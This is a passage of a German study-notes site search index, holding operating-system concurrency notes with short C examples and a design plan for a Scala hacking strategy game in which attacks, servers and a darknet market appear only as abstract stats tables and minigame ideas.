Deadlocks","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/3.%20Concurrency/0.%20Einf%C3%BChrung%20in%20Concurrency/#mutex-mutual-exclusion","title":"\ud83d\udd12 Mutex (Mutual Exclusion)","text":"<p>Ein Mutex erlaubt nur einem Thread den Zugriff auf eine kritische Sektion.</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/3.%20Concurrency/0.%20Einf%C3%BChrung%20in%20Concurrency/#semaphore","title":"\ud83d\udea6 Semaphore","text":"<p>Ein Semaphore begrenzt die Anzahl der Threads, die gleichzeitig auf eine Ressource zugreifen k\u00f6nnen.</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/3.%20Concurrency/0.%20Einf%C3%BChrung%20in%20Concurrency/#beispiel-eines-semaphores-in-c","title":"Beispiel eines Semaphores in C","text":"\ud83d\udcdd C-Code mit Mutex <pre><code>    #include &lt;semaphore.h&gt;\n    sem_t semaphore;\n\n    void* worker(void* arg) {\n        sem_wait(&amp;semaphore);  // Eintritt in kritische Sektion\n        printf(\"Thread in kritischer Sektion\\\\n\");\n        sem_post(&amp;semaphore);  // Verlassen der kritischen Sektion\n    }\n</code></pre>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/3.%20Concurrency/0.%20Einf%C3%BChrung%20in%20Concurrency/#deadlocks-avoidance","title":"\ud83d\udc1e Deadlocks &amp; Avoidance","text":"<p>Ein Deadlock tritt auf, wenn zwei Threads auf Ressourcen warten, die der jeweils andere blockiert.</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/3.%20Concurrency/0.%20Einf%C3%BChrung%20in%20Concurrency/#deadlock-szenario","title":"Deadlock-Szenario","text":"<ol> <li>Thread A h\u00e4lt Lock 1, wartet auf Lock 2.</li> <li>Thread B h\u00e4lt Lock 2, wartet auf Lock 1.</li> </ol> <p>L\u00f6sung:</p> <ul> <li>Locking-Order: Immer in der gleichen Reihenfolge sperren.</li> <li>Deadlock-Erkennung: OS kann zirkul\u00e4re Wartezust\u00e4nde aufl\u00f6sen.</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/3.%20Concurrency/0.%20Einf%C3%BChrung%20in%20Concurrency/#5-thread-kommunikation-scheduling","title":"\u26a1 5. Thread-Kommunikation &amp; Scheduling","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/3.%20Concurrency/0.%20Einf%C3%BChrung%20in%20Concurrency/#thread-scheduling","title":"Thread-Scheduling","text":"<ul> <li>Preemptive Scheduling: OS kann Threads unterbrechen.</li> <li>Cooperative Scheduling: Threads geben die Kontrolle explizit zur\u00fcck.</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/3.%20Concurrency/0.%20Einf%C3%BChrung%20in%20Concurrency/#bedingungsvariablen-condition-variables","title":"Bedingungsvariablen (Condition Variables)","text":"<p>Erlauben es Threads, zu warten, bis eine Bedingung erf\u00fcllt ist.</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/3.%20Concurrency/0.%20Einf%C3%BChrung%20in%20Concurrency/#beispiel-in-c-mit-pthread_cond_t","title":"Beispiel in C mit <code>pthread_cond_t</code>","text":"<pre><code>pthread_cond_t cond;\npthread_mutex_t lock;\n\nvoid* producer(void* arg) {\n    pthread_mutex_lock(&amp;lock);\n    pthread_cond_signal(&amp;cond);  // Weckt einen wartenden Thread auf\n    pthread_mutex_unlock(&amp;lock);\n}\n</code></pre>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/3.%20Concurrency/0.%20Einf%C3%BChrung%20in%20Concurrency/#6-debugging-von-concurrency-fehlern","title":"\ud83d\udee0\ufe0f 6. Debugging von Concurrency-Fehlern","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/3.%20Concurrency/0.%20Einf%C3%BChrung%20in%20Concurrency/#haufige-concurrency-fehler","title":"H\u00e4ufige Concurrency-Fehler","text":"<ul> <li>Race Conditions \u2192 Verwenden von Locks/Semaphoren.</li> <li>Deadlocks \u2192 Lock-Order festlegen.</li> <li>Starvation \u2192 Fairness durch Priorit\u00e4tsregeln sicherstellen.</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/3.%20Concurrency/0.%20Einf%C3%BChrung%20in%20Concurrency/#tools-fur-debugging","title":"Tools f\u00fcr Debugging","text":"<ul> <li>Valgrind (Helgrind) f\u00fcr C: Erkennung von Race Conditions.</li> <li>ThreadSanitizer f\u00fcr C++ &amp; Rust: Detektiert Data Races.</li> <li>GDB f\u00fcr Threads: Debugging auf niedriger Ebene.</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/3.%20Concurrency/0.%20Einf%C3%BChrung%20in%20Concurrency/#7-best-practices-fur-multi-threaded-programmierung","title":"\u2705 7. Best Practices f\u00fcr Multi-Threaded-Programmierung","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/3.%20Concurrency/0.%20Einf%C3%BChrung%20in%20Concurrency/#best-practices","title":"\ud83d\udd39 Best Practices","text":"<p>\u2705 Verwende Mutexe oder Semaphoren, um kritische Abschnitte zu sch\u00fctzen. \u2705 Nutze Thread-Pools, um Performance zu optimieren. \u2705 Setze Atomic Operations ein, wenn nur einfache Werte modifiziert werden m\u00fcssen. \u2705 Vermeide zu viele Locks, um Deadlocks zu verhindern. \u2705 Nutze Parallelisierungs-Patterns wie Map-Reduce oder Worker-Threads.</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/3.%20Concurrency/0.%20Einf%C3%BChrung%20in%20Concurrency/#fazit","title":"\ud83d\udccc Fazit","text":"<ul> <li>Concurrency ist essenziell f\u00fcr moderne Software.</li> <li>Threads verbessern Performance, erfordern aber Synchronisation.</li> <li>Race Conditions und Deadlocks sind typische Probleme.</li> <li>Debugging-Tools helfen, Fehler fr\u00fchzeitig zu erkennen.</li> <li>Gute Planung und Best Practices sind entscheidend f\u00fcr stabile Programme.</li> </ul>","tags":["Course/"]},{"location":"studium/Codebreaker%20-%20Cyberkrieg%28Scala%29/Grundlegende%20Idee/","title":"Grundlegende Idee","text":"","tags":["Course/"]},{"location":"studium/Codebreaker%20-%20Cyberkrieg%28Scala%29/Grundlegende%20Idee/#codebreaker-cyberkrieg","title":"Codebreaker: Cyberkrieg","text":"<p>Link zum Projekt auf Github !!Alle Commits die unter Unknown liefen waren von mir aus einem UNI-PC!!</p>","tags":["Course/"]},{"location":"studium/Codebreaker%20-%20Cyberkrieg%28Scala%29/Grundlegende%20Idee/#mogliche-roadmap","title":"M\u00f6gliche Roadmap:","text":"<ul> <li>Minigames bei (Server hacken und verteidigen)<ul> <li>Man muss code schreiben(Vorgegebenen Brute Force o.\u00c4)<ul> <li>PVE: Je nach Wahrscheinlichkeit f\u00fcr Erfolg mehr oder weniger Zeit zum code schreiben</li> <li>PVP: Derjenige der Code schneller schreibt gewinnt</li> </ul> </li> </ul> </li> <li>Darknet-Marketplace(Kaufbaure items die Vorteile bieten)</li> <li>Server k\u00f6nnen besetzt werden und passives einkommen generieren(Bitcoin mining usw.)</li> <li>etc. siehe unten:</li> </ul>","tags":["Course/"]},{"location":"studium/Codebreaker%20-%20Cyberkrieg%28Scala%29/Grundlegende%20Idee/#grundkonzept-kurzfassung","title":"Grundkonzept (Kurzfassung)","text":"<ul> <li>Ziel: Hacke das Globale Kontrollsystem (GKS) oder sammle die meisten Punkte in 20 Runden (angepasst von 15 auf 20 f\u00fcr mehr Spielraum).</li> <li>Start: Jeder Spieler beginnt mit einer zuf\u00e4lligen Operationsbasis auf einem Kontinent (50 CPU, 20 RAM, 10 Codezeilen, Level 1, Cybersecurity 20 %).</li> <li>Spielprinzip: Reise zu Serverstandorten, greife neutrale KI-Server (gro\u00dfe und Nebenserver) oder gegnerische Server an, verbessere Cybersecurity, sammle XP und Ressourcen.</li> <li>\u00c4nderungen:<ul> <li>Weltkarte spiegelt reale Kontinente wider (20x10).</li> <li>Neutrale Server: Feste gro\u00dfe KI-Server + zuf\u00e4llige Nebenserver (Side Quests, 3-6 pro Kontinent).</li> <li>Spieler starten mit einer Operationsbasis auf einem zuf\u00e4lligen Kontinent.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Codebreaker%20-%20Cyberkrieg%28Scala%29/Grundlegende%20Idee/#skizze-karte","title":"Skizze-Karte","text":"","tags":["Course/"]},{"location":"studium/Codebreaker%20-%20Cyberkrieg%28Scala%29/Grundlegende%20Idee/#detaillierte-fortschrittskurve","title":"Detaillierte Fortschrittskurve","text":"<p>Die Fortschrittskurve basiert auf Erfahrungspunkten (XP), die durch Hacks und Cybersecurity-Upgrades gesammelt werden.</p> Level Titel XP-Bedarf Angriffswahrscheinlichkeit Abwehrst\u00e4rke Freischaltungen Level 1 Unerfahrener Hacker 0 XP 50 % 20 % Brute-Force Level 2 Anf\u00e4nger-Hacker 50 XP 55 % 25 % Phishing Level 3 Fortgeschrittener 150 XP 60 % 30 % SQL-Injection Level 4 Erfahrener Hacker 300 XP 70 % 40 % DDoS, Keylogger Level 5 Elite-Hacker 500 XP 80 % 50 % Wurm, Man-in-the-Middle Level 6 Meister-Hacker 800 XP 85 % 60 % Zero-Day-Exploit <ul> <li>XP-Quellen:<ul> <li>Erfolgreicher Hack: +20 XP (Nebenserver), +30 XP (gro\u00dfer KI-Server), +40 XP (gegnerischer Server).</li> <li>Cybersecurity-Upgrade: +10 XP.</li> </ul> </li> <li>\u00c4nderungen:<ul> <li>Entfernung von Algorithmus-Optimierungen (Bubble Sort etc.), Fokus auf Angriffe und Server.</li> <li>XP-Belohnungen angepasst f\u00fcr unterschiedliche Server-Typen.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Codebreaker%20-%20Cyberkrieg%28Scala%29/Grundlegende%20Idee/#erweiterte-angriffsarten","title":"Erweiterte Angriffsarten","text":"<p>Jede Angriffsart hat Kosten und Basis-Erfolg, modifiziert durch Level, Server-Abwehr und Position (lokal +40 %).</p> Angriff Level Kosten Basis-Erfolg Effekt Realbezug Brute-Force 1 20 CPU 50 % +10 CPU/Runde (neutral) \"Testet alle Passw\u00f6rter - ressourcenintensiv.\" Phishing 2 5 Codezeilen 40 % +15 RAM (neutral) \"Nutzt menschliche Fehler - billig, unsicher.\" SQL-Injection 3 10 RAM 60 % +20 Codezeilen (neutral/gegner) \"Greift Datenbanken an - pr\u00e4zise.\" DDoS 4 30 CPU 55 % Gegner verliert 1 Runde \"\u00dcberflutet Server - effektiv gegen Schwache.\" Keylogger 4 15 CPU 50 % +20 Codezeilen (gegner) \"Zeichnet Eingaben auf - langsam, effektiv.\" Wurm 5 20 CPU, 10 RAM 65 % +10 Ressourcen/Runde (3 Runden) \"Selbstreplizierend - nachhaltig.\" Man-in-the-Middle 5 15 RAM, 10 Codezeilen 60 % Stiehlt 50 % der n\u00e4chsten Beute \"F\u00e4ngt Daten ab - perfekt f\u00fcr Sabotage.\" Zero-Day-Exploit 6 40 CPU, 20 Codezeilen 75 % +50 CPU oder RAM (einmalig) \"Nutzt unbekannte Schwachstellen - m\u00e4chtig.\" <ul> <li>Modifikatoren:<ul> <li>+5 % Erfolg pro Level.</li> <li>+40 % Erfolg bei lokalem Hack (Spieler am selben Standort wie Server).</li> </ul> </li> <li>\u00c4nderungen: Integration der Position (lokal vs. remote) als zentraler Faktor.</li> </ul>","tags":["Course/"]},{"location":"studium/Codebreaker%20-%20Cyberkrieg%28Scala%29/Grundlegende%20Idee/#server-typen","title":"Server-Typen","text":"<p>Server sind auf einer 20x10-Weltkarte verteilt, mit festen gro\u00dfen KI-Servern und zuf\u00e4lligen Nebenservern.</p> Server-Typ Schwierigkeit Ressourcenbelohnung Beschreibung Beispiel-Standort Nebenserver 20-50 % +10-20 CPU/RAM/Code Zuf\u00e4llige Side-Quest-Server auf jedem Kontinent Nordamerika (2, 9) Privater Webserver 20 % +10 CPU, +5 RAM Kleiner, schlecht gesicherter Server Mexico City (3, 6) Firmenserver 40 % +20 CPU, +10 Codezeilen Mittelgro\u00dfes Unternehmen mit solider Absicherung London (6, 8) Cloud-Server 60 % +30 RAM, +15 CPU Hochleistungsserver mit starker Sicherheitssoftware Silicon Valley (1, 7) Bankenserver 75 % +40 CPU, +20 Codezeilen Hochsicherer Finanzserver Brussels (7, 7) Milit\u00e4rserver 85 % +50 RAM, +30 CPU Staatliches System mit maximaler Sicherheit Pentagon (2, 8) GKS (Endziel) 90 % Sieg Ultimativer Supercomputer - finales Ziel Zentral (10, 5) Operationsbasis 20 % +10 CPU, +5 RAM (Start) Spieler-eigener Startserver, erweiterbar Zuf\u00e4llig pro Spieler <ul> <li>\u00c4nderungen:<ul> <li>Nebenserver: Zuf\u00e4llig 3-6 pro Kontinent, Schwierigkeit variabel (20-50 %).</li> <li>Operationsbasis: Jeder Spieler startet mit einem eigenen Server auf einem zuf\u00e4lligen Kontinent.</li> <li>Standorte sind realwelt-inspiriert und auf der Karte verteilt.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Codebreaker%20-%20Cyberkrieg%28Scala%29/Grundlegende%20Idee/#erweiterte-ereignisse","title":"Erweiterte Ereignisse","text":"<p>Ereignisse treten bei Angriffen zuf\u00e4llig ein, basierend auf Server-Typ und Erfolg/Fehlschlag.</p> Ereignis Ausl\u00f6ser Wahrscheinlichkeit Effekt Realbezug R\u00fcckverfolgung Fehlschlag 30 % (sinkt mit Level) -15 CPU \"Deine IP wurde gefunden.\" Razzia Lokaler Hack 20 % (Level &lt; 3) -1 Runde \"Beh\u00f6rden st\u00fcrmen dein Versteck.\" Datenleck Erfolgreicher Hack 10 % +20 Codezeilen (Bonus) \"Geheime Daten gefunden.\" Honeypot-Falle Neutraler Server 15 % -30 CPU, -10 RAM \"Ein K\u00f6der-Server!\" Alte Software Webserver 20 % +15 % Erfolg (n\u00e4chster) \"Veraltete Protokolle machen es einfacher.\" Intrusion Detection Firmenserver 20 % -15 CPU \"Alarmsystem hat dich entdeckt.\" Wartungsfenster Cloud-Server 10 % +25 % Erfolg (1 Runde) \"Update l\u00e4sst Verteidigung sinken.\" Sicherheitsaudit Bankenserver 30 % -25 CPU, -10 RAM \"Audit sperrt dich aus.\" Cyberkommando Milit\u00e4rserver 35 % -1 Runde, -30 CPU \"Milit\u00e4r schl\u00e4gt zur\u00fcck.\" Total-Lockdown GKS 40 % -50 % Erfolg (3 Runden) \"System isoliert sich komplett.\" <ul> <li>\u00c4nderungen:<ul> <li>Ereignisse sind jetzt server-spezifisch (z. B. \"Alte Software\" nur bei Webservern).</li> <li>Wahrscheinlichkeiten angepasst f\u00fcr Balance.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Codebreaker%20-%20Cyberkrieg%28Scala%29/Grundlegende%20Idee/#beispiel-fur-eine-runde","title":"Beispiel f\u00fcr eine Runde","text":"<ol> <li>Runde 1:<ul> <li>Spieler 1 (Level 1, Pos: (2, 8)) greift Pentagon lokal an (Brute-Force, 50 % + 40 % - 85 % = 5 %), scheitert, Cyberkommando (-1 Runde, -30 CPU).</li> <li>Spieler 2 (Level 1, Pos: (15, 7)) greift Great Firewall remote an (Brute-Force, 50 % - 75 % = 0 %), scheitert, R\u00fcckverfolgung (-15 CPU).</li> </ul> </li> <li>Runde 5:<ul> <li>Spieler 1 (Level 3, Pos: (1, 7)) greift Silicon Valley lokal an (SQL-Injection, 60 % + 40 % - 60 % + 15 % = 55 %), gelingt, +30 RAM, +15 CPU, Datenleck (+20 Codezeilen).</li> <li>Spieler 2 (Level 2) greift Nebenserver (Phishing, 40 % - 30 % + 10 % = 20 %), gelingt, +15 RAM.</li> </ul> </li> </ol>","tags":["Course/"]},{"location":"studium/Codebreaker%20-%20Cyberkrieg%28Scala%29/Grundlegende%20Idee/#actions-klasse-neu","title":"Actions-Klasse (Neu)","text":"<p>Die Actions-Klasse kapselt die Spieleraktionen und ist nun vollst\u00e4ndig in die aktuelle Version integriert.</p> Aktion Beschreibung Umsetzung Travel Reise zu einem Serverstandort (x, y) Eingabe von Koordinaten, Aufruf von game.travel HackNeutralServer Greife einen neutralen KI- oder Nebenserver an Liste neutraler Server, Auswahl per Nummer, game.attackServer ohne Gegner HackOpponentServer Greife einen gegnerischen Server an Gegnerauswahl, Serverliste, game.attackServer mit targetPlayer UpgradeCybersecurity Verbessere Cybersecurity um 10 % Direkter Aufruf von game.upgradeCybersecurity <ul> <li>\u00c4nderungen:<ul> <li>Vollst\u00e4ndig kompatibel mit der neuen Weltkarte (Server-Positionen).</li> <li>Interaktive Eingaben f\u00fcr Serverauswahl integriert.</li> <li>Fehlerhafte alte Aufrufe (z. B. attackNeutralServer) entfernt.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Codebreaker%20-%20Cyberkrieg%28Scala%29/Grundlegende%20Idee/#fazit","title":"Fazit","text":"<ul> <li>Weltkarte: Realistisch mit Kontinenten, festen KI-Servern (z. B. Pentagon) und zuf\u00e4lligen Nebenservern (3-6 pro Kontinent).</li> <li>Operationsbasis: Jeder Spieler startet auf einem zuf\u00e4lligen Kontinent mit einer Basis.</li> <li>Actions: Voll funktionsf\u00e4hig, mit klarer Trennung von Logik und Eingabe.</li> <li>Server und Ereignisse: Vielf\u00e4ltig, server-spezifisch und strategisch ausbalanciert.</li> </ul>","tags":["Course/"]},{"location":"studium/Codebreaker%20-%20Cyberkrieg%28Scala%29/Grundlegende%20Idee/#roadmap-erweiterung-interaktive-mini-games-komplexere-aktionen","title":"\ud83d\udd27 Roadmap-Erweiterung: Interaktive Mini-Games &amp; komplexere Aktionen","text":"","tags":["Course/"]},{"location":"studium/Codebreaker%20-%20Cyberkrieg%28Scala%29/Grundlegende%20Idee/#1-minigames-beim-server-hacken-pve-pvp","title":"\ud83d\udcbb 1. Minigames beim Server-Hacken (PVE / PVP)","text":"<ul> <li> <p>Brute Force Code-Knackung (PVE):</p> <ul> <li> <p>Spieler bekommt pseudo-zuf\u00e4lligen Code (z.B. <code>\"7GxP4\"</code>), den er schnell eintippen muss.</p> </li> <li> <p>Zeit h\u00e4ngt von der Erfolgswahrscheinlichkeit ab:</p> <ul> <li> <p>80%? \u2192 Spieler bekommt nur 5 Sekunden Zeit.</p> </li> <li> <p>30%? \u2192 Spieler hat 15 Sekunden.</p> </li> </ul> </li> <li> <p>Optional: Fehler reduzieren den Erfolg (z.B. jeder Tippfehler = -10% Chance).</p> </li> </ul> </li> <li> <p>PVP-Version (zwei Spieler greifen gleichen Server an):</p> <ul> <li> <p>Wer schneller (und fehlerfreier) den Code schreibt, claimt den Server zuerst.</p> </li> <li> <p>Beide sehen denselben Code oder unterschiedliche mit vergleichbarer Schwierigkeit.</p> </li> </ul> </li> <li> <p>Optional: Codes k\u00f6nnen Mechanik repr\u00e4sentieren:</p> <ul> <li> <p>BruteForce \u2192 Zahlencode (123456).</p> </li> <li> <p>SQL-Injection \u2192 Tippe einen g\u00fcltigen SQL-Befehl.</p> </li> <li> <p>Phishing \u2192 Entscheide schnell, welcher Text glaubw\u00fcrdig ist (Multiple Choice).</p> </li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Codebreaker%20-%20Cyberkrieg%28Scala%29/Grundlegende%20Idee/#2-social-engineering-mitarbeiter-verfuhrung","title":"\ud83e\udde0 2. Social Engineering / Mitarbeiter-Verf\u00fchrung","text":"<ul> <li> <p>Mini-Spiel mit Dialog-Optionen (Dialog-Baum):</p> <ul> <li> <p>NPC sagt: \u201eWarum brauchst du Zugriff auf das Intranet?\u201c     \u2192 Antwortm\u00f6glichkeiten:</p> <ol> <li>\u201eIch bin vom IT-Support\u201c</li> <li>\u201eIch bin neuer Praktikant\u201c</li> <li>\u201eIch muss mit deinem Chef reden\u201c</li> </ol> </li> <li> <p>Jede Antwort hat Wahrscheinlichkeiten basierend auf Spieler-Stats (z.B. Level, Reputation, getarnte Identit\u00e4t).</p> </li> <li>Wenn erfolgreich \u2192 Zugang zum Serverraum oder Bonus-Info.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Codebreaker%20-%20Cyberkrieg%28Scala%29/Grundlegende%20Idee/#3-physisches-eindringen-in-servergebaude","title":"\ud83d\udddd\ufe0f 3. Physisches Eindringen in Servergeb\u00e4ude","text":"<ul> <li> <p>Beim lokalen Betreten eines Servers:</p> <ul> <li> <p>Mini-Game Schlossknacken (Lockpicking):</p> <ul> <li> <p>z.B. ASCII-basierte Darstellung (bspw. <code>| | | | |</code>) mit verschiedenen \u201ePin\u201c-Stellungen.</p> </li> <li> <p>Spieler muss Reihenfolge oder Takt (Timing) erraten.</p> </li> <li> <p>Fehlversuche triggern ggf. Alarm (Risk-Score ++).</p> </li> </ul> </li> <li> <p>Sicherheitskamera umgehen (Maze):</p> <ul> <li> <p>Spieler bewegt sich (\u2191 \u2193 \u2190 \u2192) durch ein ASCII-Labyrinth.</p> </li> <li> <p>Kameras bewegen sich zyklisch - man muss im richtigen Moment vorbei.</p> </li> <li> <p>Bei Fehler: R\u00fcckverfolgung + Alarm + eventuelle Sperre.</p> </li> </ul> </li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Codebreaker%20-%20Cyberkrieg%28Scala%29/Grundlegende%20Idee/#4-gegenmanahmen-beim-verteidigen-von-servern-defense-mini-games","title":"\ud83d\udd01 4. Gegenma\u00dfnahmen beim Verteidigen von Servern (Defense Mini-Games)","text":"<ul> <li> <p>Falls ein geclaimter Server angegriffen wird:</p> <ul> <li> <p>Verteidiger bekommt Chance, sich zu wehren:</p> <ul> <li> <p>Firewall-Spiel: Blocke eingehende Pakete (z.B. per Tastendruck)     \u2192 z.B. wie Pong: \"Gef\u00e4hrliche Pakete\" kommen rein, du bewegst Firewall links/rechts.</p> </li> <li> <p>Code-Flicken: Zeige dem Verteidiger eine Zeile mit Bugs (offenes Port, unsicherer Code) - muss in 5 Sekunden behoben werden.</p> </li> <li> <p>Security Patch Memory: Zeige 4-6 Sicherheitsl\u00fccken, dann deck sie ab. Danach: \u201eWas war an Position 3?\u201c.</p> </li> </ul> </li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Codebreaker%20-%20Cyberkrieg%28Scala%29/Grundlegende%20Idee/#5-recon-informationsbeschaffung","title":"\ud83d\udd0d 5. Recon / Informationsbeschaffung","text":"<ul> <li> <p>Mini-Game: Netzwerkscan \u2192 Spieler bekommt ein Netzdiagramm, muss Pfad finden zum Zielserver.</p> </li> <li> <p>Alternativ:</p> <ul> <li>Multiple-Choice-Fragen zum Ziel:     \u201eWelche OS-Version l\u00e4uft dort?\u201c - Spieler muss aus Logs erraten. \u201eWie lange war Server online?\u201c - Hinweise aus Fake-E-Mails.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Codebreaker%20-%20Cyberkrieg%28Scala%29/Grundlegende%20Idee/#6-reisen-tarnung","title":"\ud83d\udccd 6. Reisen &amp; Tarnung","text":"<ul> <li> <p>Wenn Spieler von Kontinent zu Kontinent reisen:</p> <ul> <li> <p>Passkontrolle umgehen / Flughafen hacken:</p> <ul> <li> <p>Spiel: Falschen QR-Code generieren (eine Matrix manipulieren).</p> </li> <li> <p>Optional: Fingerabdruck-Simulator (Timing-basierte Leiste, richtige Sektion treffen).</p> </li> </ul> </li> </ul> </li> <li> <p>VPN einrichten:</p> <ul> <li> <p>Mini-Spiel: Baue eine Route aus geclaimten Servern, aber...</p> </li> <li> <p>Zwischenstationen mit hoher Belastung sind weniger anonym \u2192 Spieler muss schnell entscheiden.</p> </li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Codebreaker%20-%20Cyberkrieg%28Scala%29/Grundlegende%20Idee/#7-ressourcenverwaltung-als-puzzle-game","title":"\ud83d\udce6 7. Ressourcenverwaltung als Puzzle-Game","text":"<ul> <li> <p>Bei hoher Serverlast (z.B. viele Claims):</p> <ul> <li> <p>Spieler muss Ressourcen umverteilen, um alles am Laufen zu halten:</p> <ul> <li> <p>Mini-Tetris: RAM-/CPU-Bl\u00f6cke richtig stapeln, ohne \u00dcberlast.</p> </li> <li> <p>Drag-and-Drop-Simulation: CPU zuweisen zu Servern, aber: je l\u00e4nger du brauchst, desto eher wird einer entdeckt.</p> </li> </ul> </li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Codebreaker%20-%20Cyberkrieg%28Scala%29/Grundlegende%20Idee/#8-zentrale-herausforderung-boss-hack-gks","title":"\ud83e\udde9 8. Zentrale Herausforderung: Boss-Hack / GKS","text":"<ul> <li> <p>Finales Mini-Game: Mischung aus allen o.g. Elementen.</p> </li> <li> <p>z.B. Mehrere \u201eFirewall-Layer\u201c:</p> <ul> <li> <p>Level 1: Lockpicking.</p> </li> <li> <p>Level 2: SQL-Guess.</p> </li> <li> <p>Level 3: Reverse Engineering (z.B. Code verstehen und \u00e4ndern).</p> </li> <li> <p>Timer l\u00e4uft \u2192 je schneller du bist, desto h\u00f6her deine Chancen.</p> </li> <li> <p>GKS = Supercomputer \u2192 fast wie ein \u201eEscape Room\u201c.</p> </li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Codebreaker%20-%20Cyberkrieg%28Scala%29/Grundlegende%20Idee/#weitere-spontane-ideen","title":"\ud83d\udca1 Weitere spontane Ideen","text":"<ul> <li> <p>Marktplatz im Darknet: F\u00fchre ein Schwarzmarkt-Men\u00fc ein</p> <ul> <li>Kaufe Exploits, Zero-Day-VPNs, Insider-Infos</li> <li>Gib Geld aus \u2192 weniger Risiko selbst etwas zu tun</li> </ul> </li> <li> <p>Beziehungen zu NPCs:</p> <ul> <li>Kontakte innerhalb Firmen, bei Sicherheitsfirmen</li> <li>Manche Server sind nur angreifbar, wenn man \u201ejemanden kennt\u201c</li> </ul> </li> <li> <p>KI-Verteidiger:</p> <ul> <li>Manche Firmen haben eine adaptive AI \u2192 je \u00f6fter du sie angreifst, desto besser kontert sie.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Codebreaker%20-%20Cyberkrieg%28Scala%29/Grundlegende%20Idee/#darknet-marktplatz-feature-planung","title":"\ud83d\udd78\ufe0f DARKNET-MARKTPLATZ - Feature-Planung","text":"","tags":["Course/"]},{"location":"studium/Codebreaker%20-%20Cyberkrieg%28Scala%29/Grundlegende%20Idee/#1-kaufbare-items-dienste","title":"\ud83d\uded2 1. Kaufbare Items &amp; Dienste","text":"<p>Spieler k\u00f6nnen mit verdientem Geld (z.\u202fB. aus Server-Einnahmen, Nebenauftr\u00e4gen oder geklauten Bitcoins) Tools &amp; Services erwerben.</p>","tags":["Course/"]},{"location":"studium/Codebreaker%20-%20Cyberkrieg%28Scala%29/Grundlegende%20Idee/#erweiterungs-typen","title":"\ud83d\udd27 Erweiterungs-Typen:","text":"Item Kosten Effekt Risiko Zero-Day-Exploit 500\u20bf +20% Erfolgswahrscheinlichkeit bei jedem Hack (1x verwendbar) Hoch VPN-Kette (5 Hops) 200\u20bf Reduziert R\u00fcckverfolgungschance um 40% f\u00fcr 3 Runden Niedrig Insider-Kontakt 300\u20bf Deckt Position &amp; Infos zu verstecktem Firmenserver auf Mittel Keylogger-Modul 150\u20bf Erm\u00f6glicht passives Code-Farming pro Runde bei geclaimtem Server Niedrig Proxy-Bypasser 250\u20bf Reduziert Schwierigkeit eines Serverhacks um 10 % Mittel Backdoor-Auto-Installer 350\u20bf Erm\u00f6glicht sofortiges Claimen nach erfolgreichem Hack Hoch Malware-Library 400\u20bf Freischaltung neuer Angriffsmethoden (z.\u202fB. \"Ransomware\") Mittel Stealth Shield 600\u20bf Tempor\u00e4r keine Aufdeckungswahrscheinlichkeit bei Einnahmen (2 Runden) Niedrig","tags":["Course/"]},{"location":"studium/Codebreaker%20-%20Cyberkrieg%28Scala%29/Grundlegende%20Idee/#2-eigene-server-nutzung-im-darknet","title":"\ud83d\udcb0 2. Eigene Server-Nutzung im Darknet","text":"<p>Geclaimte Server k\u00f6nnen als Infrastruktur genutzt werden - je nachdem, wie du sie konfigurierst, generieren sie passives Einkommen, aber erh\u00f6hen auch das Entdeckungsrisiko!</p>","tags":["Course/"]},{"location":"studium/Codebreaker%20-%20Cyberkrieg%28Scala%29/Grundlegende%20Idee/#server-rollen","title":"\ud83e\uddf1 Server-Rollen","text":"Server-Rolle Einnahmen (pro Runde) Risiko aufzudecken (%) Effekte / Besonderheiten Bitcoin Miner +25-50\u20bf 20-50% CPU-abh\u00e4ngig. Rechenstarke Server \u2192 mehr Coins. Darknet-Host +15-40\u20bf 10-30% Traffic erzeugt Aufmerksamkeit. Optional verschleierbar. Datenh\u00e4ndler +20-45\u20bf 15-45% Nur m\u00f6glich bei vorherigem Datenleck Command &amp; Control Node +30\u20bf (und Botnet-Funktion) 60% Aktiviert besondere Angriffe wie Massen-DDoS. <p>\ud83d\udca1 Du kannst in der Runde entscheiden, welche Rolle ein Server bekommt - oder ihn nur passiv lassen (sicherer, aber kein Gewinn).</p>","tags":["Course/"]},{"location":"studium/Codebreaker%20-%20Cyberkrieg%28Scala%29/Grundlegende%20Idee/#4-zufallige-darknet-ereignisse","title":"\ud83e\uddea 4. Zuf\u00e4llige Darknet-Ereignisse","text":"<p>Jede Runde mit Darknet-Aktivit\u00e4t kann Events triggern:</p> Event Wahrscheinlichkeit Effekt Aufdeckung variiert Verlust von Server / Geldstrafe / XP-Strafe Darknet-Razzia 10 % Alle Einnahmen dieser 